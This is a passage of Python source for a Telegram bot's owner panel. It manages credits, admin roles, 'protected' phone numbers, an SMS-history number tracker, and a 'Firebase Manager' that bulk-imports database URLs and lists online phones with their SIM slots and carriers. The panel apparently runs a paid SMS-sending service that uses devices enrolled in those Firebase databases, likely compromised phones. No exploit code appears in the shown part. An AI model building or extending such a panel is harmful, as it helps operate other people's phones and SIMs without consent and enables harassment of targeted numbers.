    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    n = msg.text.strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer("❌ Invalid number:", parse_mode="HTML"); return
    PROTECTED_NUMBERS[n] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save_now(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n"
        f"<code>{escape(n)}</code> by <code>{uid}</code>",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]),
        parse_mode="HTML")
    log_activity(d, "number_protected", uid, f"Protected {n}")
    save_now(d)


@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    prot = d.get("protected_numbers", {})
    if not prot:
        await safe_edit(cq.message,
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers</b>\n\n❌ none",
            reply_markup=kb([("ʙᴀᴄᴋ", "owner:cat:system")]),
            parse_mode="HTML"); return
    is_o = is_owner(uid, d) or is_main_owner(uid)
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers</b>\n"]
    for n, pu in prot.items():
        disp = n if is_o else mask_number(n)
        pn = d.get("users", {}).get(str(pu), {}).get("name", "Unknown")
        lines.append(f"📞 <code>{disp}</code> — <code>{pu}</code> ({escape(pn)})")
    rows = []
    if is_o:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:cat:system", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, "\n".join(lines),
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫", show_alert=True); return
    prot = d.get("protected_numbers", {})
    if not prot:
        await cq.answer("❌ koi protected number nahi", show_alert=True); return
    rows = []
    for n, _ in prot.items():
        rows.append([btn(n, f"owner:protected_del:{n}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, f"🗑 <b>Remove protection</b>\n\nSelect number:",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫", show_alert=True); return
    n = cq.data.split("owner:protected_del:", 1)[1]
    if n in d.get("protected_numbers", {}):
        del d["protected_numbers"][n]
        save_now(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ removed {n}", show_alert=True)
    else:
        await cq.answer("❌ not found", show_alert=True)
    await owner_protected_list(cq, state)


@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.track_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\nEnter number to track:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML")


@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    n = msg.text.strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer("❌ Invalid:", parse_mode="HTML"); return
    await state.clear()
    hist = d.get("sms_history", {})
    users = []
    for us, hl in hist.items():
        for e in hl:
            if e.get("number") == n:
                ud = d.get("users", {}).get(us, {})
                users.append({"uid": int(us), "name": ud.get("name", "Unknown"),
                              "ts": e.get("timestamp", 0)})
                break
    if not users:
        await msg.answer(
            f"📊 <b>Number Tracker</b>\n\n📞 <code>{escape(n)}</code>\n\n❌ none",
            reply_markup=kb([("ʙᴀᴄᴋ", "owner:cat:system")]),
            parse_mode="HTML"); return
    lines = [f"📊 <b>Number Tracker</b>\n\n📞 <code>{escape(n)}</code>\n"]
    for u in users:
        lines.append(f"• <code>{u['uid']}</code> — {escape(u['name'][:20])} — {fmt_time(u['ts'])}")
    await msg.answer("\n".join(lines),
                    reply_markup=kb([("ʙᴀᴄᴋ", "owner:cat:system")]),
                    parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# CREDITS ALL
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_all_credits_amount)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL</b>\n\nKitne credits?",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML")


@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer("❌ positive number:", parse_mode="HTML"); return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer("❌ no users", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML"); return
    count = 0
    for us in users:
        add_credits(int(us), amount, d, is_manual=True)
        count += 1
    save_now(d)
    notif = (f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
            f"{em(EMOJI_GIFT, '🎉')} +<b>{amount}</b> credits!\n"
            f"{em(EMOJI_MONEY, '💳')} /start se check karein")
    ok = 0
    for us in users:
        try:
            await msg.bot.send_message(int(us), notif, parse_mode="HTML")
            ok += 1
            await asyncio.sleep(0.05)
        except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Done!</b>\n\n"
        f"💰 {amount} each\n👥 total: <b>{count}</b>\n📨 notified: <b>{ok}</b>",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]),
        parse_mode="HTML")
    log_activity(d, "add_credits_all", uid, f"Added {amount} to {count}")
    save_now(d)


@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.deduct_all_credits_amount)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct from ALL</b>\n\nKitne credits?",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML")


@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_confirm(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount < 0: raise ValueError
    except:
        await msg.answer("❌ positive number:", parse_mode="HTML"); return
    await state.update_data(deduct_all_amount=amount)
    await msg.answer(
        f"⚠️ <b>Confirm Deduct ALL</b>\n\n{amount} credits se sabhi se?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            btn("✅ ʏᴇs", "owner:deduct_all_yes", EMOJI_CHECK, "✅", style="success"),
            btn("❌ ɴᴏ", "owner:home", EMOJI_CROSS, "❌", style="danger"),
        ]]),
        parse_mode="HTML")


@R.callback_query(F.data == "owner:deduct_all_yes")
async def owner_deduct_all_yes_handler(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫", show_alert=True); return
    data = await state.get_data()
    amount = data.get("deduct_all_amount", 0)
    await state.clear()
    users = d.get("users", {})
    if not users:
        await safe_edit(cq.message, "❌ none", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML"); return
    count = 0; td = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for us, ud in users.items():
        ui = int(us)
        if ui in owners or ui in admins: continue
        cur = ud.get("credits", 0)
        man = ud.get("manual_added_credits", 0)
        pool = max(0, cur - man)
        if pool > 0:
            td_ = min(amount, pool)
            if td_ > 0:
                ud["credits"] = cur - td_
                count += 1; td += td_
    save_now(d)
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '✅')} <b>Deducted!</b>\n\n"
        f"💰 Amount: <b>{amount}</b>\n👥 affected: <b>{count}</b>\n💳 total: <b>{td}</b>",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]),
        parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# USER TRANSFER
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 banned", show_alert=True); return
    if not can_use(uid, d):
        await cq.answer("⛔ no access", show_alert=True); return
    cc = get_user_credits(uid, d)
    if cc < 2:
        await cq.answer("❌ min 2 credits", show_alert=True); return
    await state.set_state(S.transfer_credits_uid)
    await safe_edit(cq.message,
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n\n"
        f"💰 your credits: <b>{cc}</b>\n"
        f"⚠️ max <b>half</b> transfer\n\n"
        f"Target user ID:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML")


@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    try:
        target = int(msg.text.strip())
    except:
        await msg.answer("❌ valid ID:", parse_mode="HTML"); return
    if target == uid:
        await msg.answer("❌ self-transfer nahi:", parse_mode="HTML"); return
    if str(target) not in d.get("users", {}):
        await msg.answer("❌ user not found:", parse_mode="HTML"); return
    cc = get_user_credits(uid, d)
    if cc < 2:
        await msg.answer("❌ min 2 credits:", parse_mode="HTML"); return
    await state.update_data(transfer_target=target)
    await state.set_state(S.transfer_credits_amount)
    half = cc // 2
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} Amount\n\n"
        f"Target: <code>{target}</code>\n"
        f"Your: <b>{cc}</b>\nMax: <b>{half}</b>\n\nKitne?",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML")


@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer("❌ positive number:", parse_mode="HTML"); return
    fsmd = await state.get_data()
    target = fsmd.get("transfer_target")
    cc = get_user_credits(uid, d)
    half = cc // 2
    if amount > half:
        await msg.answer(f"❌ max {half}:", parse_mode="HTML"); return
    if not deduct_credits(uid, amount, d):
        await msg.answer("❌ insufficient:", parse_mode="HTML"); return
    add_credits(target, amount, d)
    save_now(d)
    await state.clear()
    try:
        await msg.bot.send_message(target,
            f"{em(EMOJI_MONEY, '💸')} <b>Credits Received!</b>\n\n"
            f"from: <code>{uid}</code>\nAmount: <b>{amount}</b>\n"
            f"Balance: <b>{get_user_credits(target, d)}</b>",
            parse_mode="HTML")
    except: pass
    await msg.answer(
        f"✅ <b>Transfer Successful</b>\n\nTo: <code>{target}</code>\n"
        f"Amount: <b>{amount}</b>\nBalance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]),
        parse_mode="HTML")
    log_activity(d, "credit_transfer", uid, f"{amount} to {target}")
    save_now(d)


# ═══════════════════════════════════════════════════════════════════════
# HOME / REFRESH
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    try:
        await safe_edit(cq.message, owner_panel_text(d),
                        reply_markup=owner_home_kb_v2(d), parse_mode="HTML")
    except TelegramBadRequest: pass


@R.callback_query(F.data.startswith("owner:cat:"))
async def owner_category(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    cat = cq.data.split(":")[2]
    titles = {
        "users":   f"{em(EMOJI_STAR, '👥')} <b>Users & Roles</b>",
        "content": f"{em(EMOJI_VIDEO, '📹')} <b>Content</b>",
        "credits": f"{em(EMOJI_MONEY, '💰')} <b>Credits & Pricing</b>",
        "system":  f"{em(EMOJI_GEAR, '⚙️')} <b>System</b>",
    }
    await safe_edit(cq.message, titles.get(cat, "Panel"),
                    reply_markup=owner_cat_kb(cat), parse_mode="HTML")


@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    try:
        await safe_edit(cq.message, admin_panel_text(d),
                        reply_markup=admin_home_kb_v2(d), parse_mode="HTML")
    except TelegramBadRequest: pass


# ═══════════════════════════════════════════════════════════════════════
# FIREBASE MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    await safe_edit(cq.message,
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
        reply_markup=fb_menu_kb(d, page), parse_mode="HTML")


@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_firebase)
    await safe_edit(cq.message,
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\n"
        f"Format: <code>Label | URL</code>\n"
        f"Example: <code>MyApp | https://myapp.firebaseio.com</code>",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:fb:menu:0")]),
        parse_mode="HTML")


@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    text = msg.text.strip()
    if "|" in text:
        label, url = [p.strip() for p in text.split("|", 1)]
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer("❌ must start with https://:", parse_mode="HTML"); return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer("⚠️ already added", reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save_now(d)
    await state.clear()
    await msg.answer(f"✅ <b>Added!</b>\n\n🏷 {escape(label)}\n🔗 <code>{escape(url)}</code>",
                    reply_markup=fb_menu_kb(load()), parse_mode="HTML")


@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_firebase_file)
    await safe_edit(cq.message,
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add via TXT</b>\n\n"
        f"Upload <code>.txt</code> with urls (one per line):\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:fb:menu:0")]),
        parse_mode="HTML")


@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    doc = msg.document
    if not doc.file_name.endswith(".txt"):
        await msg.answer("❌ .txt only", parse_mode="HTML"); return
    fi = await msg.bot.get_file(doc.file_id)
    buf = await msg.bot.download_file(fi.file_path)
    content = buf.read().decode("utf-8", errors="ignore")
    fbs = d.get("firebases", [])
    seen = {fb["url"].rstrip("/") for fb in fbs}
    added = 0; skipped = 0
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if "|" in line:
            label, url = [p.strip() for p in line.split("|", 1)]
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not (url.startswith("http://") or url.startswith("https://")): continue
        url = url.rstrip("/")
        if url in seen:
            skipped += 1; continue
        seen.add(url)
        fid = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({"id": fid, "url": url, "label": label, "added_at": int(time.time())})
        added += 1
    d["firebases"] = fbs
    save_now(d)
    await state.clear()
    await msg.answer(
        f"✅ <b>TXT Processed</b>\n\n🔥 added: <b>{added}</b>\n⚠️ skipped: <b>{skipped}</b>\n"
        f"📊 total: <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()), parse_mode="HTML")


@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} valid .txt file:", parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:fb:view:"))
async def fb_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    fb_id = cq.data.split(":")[3]
    fb = next((f for f in d.get("firebases", []) if f["id"] == fb_id), None)
    if not fb:
        await cq.answer("❌", show_alert=True); return
    await safe_edit(cq.message, fb_detail_text(fb, d),
                    reply_markup=fb_detail_kb(fb_id, 0), parse_mode="HTML")


@R.callback_query(F.data.startswith("fb:test:"))
async def fb_test(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    fid = cq.data.split(":")[2]
    fb = next((f for f in d["firebases"] if f["id"] == fid), None)
    if not fb:
        await cq.answer("❌", show_alert=True); return
    await cq.answer("⏳ testing...")
    t0 = time.time()
    try:
        async with http().get(fb["url"] + "/.json?shallow=true") as r:
            ok = r.status == 200
            lat = int((time.time() - t0) * 1000)
    except Exception:
        ok, lat = False, 0
    msg = f"✅ OK ({lat}ms)" if ok else "❌ FAILED"
    await cq.answer(msg, show_alert=True)
    if ok: breaker_for(fb["url"]).record_success()
    else: breaker_for(fb["url"]).record_failure()


@R.callback_query(F.data.startswith("fb:rescan:"))
async def fb_rescan(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("🔄 rescanning...")
    await get_all_online_devices(d)
    fid = cq.data.split(":")[2]
    fb = next((f for f in d["firebases"] if f["id"] == fid), None)
    if fb:
        await safe_edit(cq.message, fb_detail_text(fb, d),
                        reply_markup=fb_detail_kb(fid), parse_mode="HTML")


@R.callback_query(F.data.startswith("fb:devs:"))
async def fb_devices_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    fid = cq.data.split(":")[2]
    fb = next((f for f in d.get("firebases", []) if f["id"] == fid), None)
    if not fb:
        await cq.answer("❌", show_alert=True); return
    devices = [dv for dv in CACHED_DEVICES if dv["fb_id"] == fid]
    if not devices:
        text = f"{em(EMOJI_PHONE, '📱')} <b>Devices</b> · {escape(fb.get('label',''))}\n\n😴 none"
    else:
        lines = [f"{em(EMOJI_PHONE, '📱')} <b>Devices</b> · {escape(fb.get('label',''))}\n"]
        for dv in devices:
            sims = dv.get("sims", []) or [{}]
            sl = []
            for i, s in enumerate(sims):
                c = escape(s.get("carrierName", s.get("network", f"SIM{i+1}")))
                slot = s.get("simSlotIndex", i)
                sl.append(f"     slot {slot} · {c}")
            lines.append(f"\n{em(EMOJI_CHECK, '🟢')} <b>{escape(dv['dev_name'][:22])}</b>")
            lines.extend(sl)
        text = "\n".join(lines)
    rows = [
        [btn("🔄 ʀᴇsᴄᴀɴ", f"fb:rescan:{fid}", EMOJI_GEAR, "🔄", style="primary")],
        [btn("ʙᴀᴄᴋ", f"owner:fb:view:{fid}", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq.message, text,
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                    parse_mode="HTML")


@R.callback_query(F.data.startswith("fb:del_confirm:"))
async def fb_del_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    fid = parts[2]
    page = int(parts[3]) if len(parts) > 3 else 0
    fb = next((f for f in d.get("firebases", []) if f["id"] == fid), None)
    if not fb:
        await cq.answer("❌", show_alert=True); return
    dc = sum(1 for dv in CACHED_DEVICES if dv["fb_id"] == fid)
    await safe_edit(cq.message,
        f"⚠️ <b>Remove Firebase?</b>\n\n"
        f"🔥 {escape(fb.get('label',''))}\n"
        f"🔗 <code>{escape(fb['url'])}</code>\n\n"
        f"📱 {dc} device(s)\n\n<i>undo nahi hota</i>",
        reply_markup=kb(
            [("✅ ʏᴇs", f"fb:del_do:{fid}:{page}")],
            [("❌ ᴄᴀɴᴄᴇʟ", f"owner:fb:view:{fid}")]),
        parse_mode="HTML")


@R.callback_query(F.data.startswith("fb:del_do:"))
async def fb_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    fid = parts[2]
    page = int(parts[3]) if len(parts) > 3 else 0
    d["firebases"] = [f for f in d["firebases"] if f["id"] != fid]
    save_now(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv["fb_id"] != fid]
    FB_DEVICE_COUNTS.pop(fid, None)
    await cq.answer("🗑 removed")
    d = load()
    await safe_edit(cq.message,
        f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
        reply_markup=fb_menu_kb(d, page), parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    # legacy wrapper → route to confirm
    parts = cq.data.split(":")
    fid = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    cq.data = f"fb:del_confirm:{fid}:{page}"
    await fb_del_confirm(cq, state)


# ═══════════════════════════════════════════════════════════════════════
# STATS
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("⏳ fetching...")
    cur = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") in cur]
    for k in [k for k in FB_DEVICE_COUNTS if k not in cur]:
        FB_DEVICE_COUNTS.pop(k, None)
    devices = get_cached_devices() or await get_all_online_devices(d)
    text = api_stats_text(d)
    dl = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>"]
    if not devices:
        dl.append("  😴 none")
    for dv in devices:
        dl.append(f"  📱 <b>{escape(dv['dev_name'][:20])}</b>\n     🔥 {escape(dv['fb_label'][:25])}\n"
                 f"     📶 SIMs: {len(dv['sims']) or 1}")
    full = text + "\n" + "\n".join(dl)
    if len(full) > 4000: full = full[:3990] + "\n<i>...truncated</i>"
    await safe_edit(cq.message, full,
                    reply_markup=kb([("🔄 ʀᴇғʀᴇsʜ", "owner:stats"),
                                     ("ʙᴀᴄᴋ", "owner:home")]),
                    parse_mode="HTML")


@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("⏳")
    cur = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") in cur]
    devices = get_cached_devices() or await get_all_online_devices(d)
    text = api_stats_text(d)
    dl = [f"\n🟢 <b>Devices ({len(devices)})</b>"]
    for dv in devices[:20]:
        dl.append(f"  📱 {escape(dv['dev_name'][:20])} — 🔥 {escape(dv['fb_label'][:20])}")
    full = text + "\n" + "\n".join(dl)
    if len(full) > 4000: full = full[:3990] + "\n<i>...</i>"
    await safe_edit(cq.message, full,
                    reply_markup=kb([("🔄 ʀᴇғʀᴇsʜ", "admin:stats"),
                                     ("ʙᴀᴄᴋ", "admin:home")]),
                    parse_mode="HTML")


# ═══════════════════════════════════════════════════════════════════════
# OWNERS / ADMINS
# ═══════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await safe_edit(cq.message,
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(d.get('owners', []))}/6</b>",
        reply_markup=owners_menu_kb(d), parse_mode="HTML")


@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ max 6", show_alert=True); return
    await state.set_state(S.add_owner)
    await safe_edit(cq.message,
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nChat ID bhejo:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:owners:menu")]),
        parse_mode="HTML")


@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        nid = int(msg.text.strip())
    except:
        await msg.answer("❌ valid ID:", parse_mode="HTML"); return
    if is_owner(nid, d):
        await state.clear()
        await msg.answer("⚠️ already", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer("❌ max", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    d["owners"].append(nid)
    save_now(d)
    await state.clear()
    await msg.answer(f"✅ <b>Added!</b>\n<code>{nid}</code>",
                    reply_markup=owners_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(nid,
            f"{em(EMOJI_CROWN, '🔱')} <b>Super Admin bana diya!</b>", parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    did = int(cq.data.split(":")[-1])
    if not is_owner(uid, d):
        await cq.answer("🚫", show_alert=True); return
    if did == MAIN_OWNER or did in SUPER_ADMINS:
        await cq.answer("❌ can't remove", show_alert=True); return
    if did in d["owners"]:
        d["owners"].remove(did)
        save_now(d)
        await cq.answer("🗑 removed")
    await owner_owners_menu(cq, state)


@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await safe_edit(cq.message,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d.get('admins', []))}</b>",
        reply_markup=admins_menu_kb(d), parse_mode="HTML")


@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_admin)
    await safe_edit(cq.message,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nUser ID bhejo:",
        reply_markup=kb([("❌ ᴄᴀɴᴄᴇʟ", "owner:admins:menu")]),
        parse_mode="HTML")


@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        nid = int(msg.text.strip())
    except:
        await msg.answer("❌ valid:", parse_mode="HTML"); return
    if nid in d.get("admins", []) or is_owner(nid, d):
        await state.clear()
        await msg.answer("⚠️ already", reply_markup=admins_menu_kb(d), parse_mode="HTML"); return
    d["admins"].append(nid)
    save_now(d)
    await state.clear()
    await msg.answer(f"✅ <b>Admin added!</b>\n<code>{nid}</code>",
                    reply_markup=admins_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(nid,
